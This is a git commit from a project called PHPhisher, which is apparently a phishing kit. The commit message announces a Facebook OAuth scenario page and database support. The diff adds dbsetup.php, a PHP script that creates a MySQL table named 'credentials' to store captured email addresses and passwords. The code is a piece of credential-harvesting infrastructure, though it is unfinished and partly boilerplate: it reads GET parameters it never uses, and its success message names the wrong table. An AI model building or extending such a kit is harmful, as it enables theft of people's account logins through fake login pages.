6370246e85b62ca5b00b8f3c52d813f622f6b141
Nick <nikospower1999@gmail.com>
2017-01-01 20:42:58 +0200

    PHPhisher Version 3.0 snapshot #1
    A huge amount of bugs. Some things work, some other don't.
    + New Facebook OAuth Scenario Page (unstable)
    + MySQL Database implementation (unstable)
    More things are coming soon

---
+++ dbsetup.php
@@ -0,0 +1,33 @@
+<?php
+$json = json_decode(file_get_contents("config.json"), true);
+$dbuser = $json['dbuser'];
+$servername = $json['dbip'];
+$dbpass = $json['dbpass'];
+$dbname = $json['dbname'];
+$password = $_GET['password'];
+$email = $_GET['email'];
+
+
+// Create connection
+$conn = mysqli_connect($servername, $dbuser, $dbpass, $dbname);
+// Check connection
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+
+// sql to create table
+$sql = "CREATE TABLE credentials (
+id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, 
+password VARCHAR(30) NOT NULL,
+email VARCHAR(50),
+reg_date TIMESTAMP
+)";
+
+if (mysqli_query($conn, $sql)) {
+    echo "Table MyGuests created successfully";
+} else {
+    echo "Error creating table: " . mysqli_error($conn);
+}
+
+mysqli_close($conn);
+?>
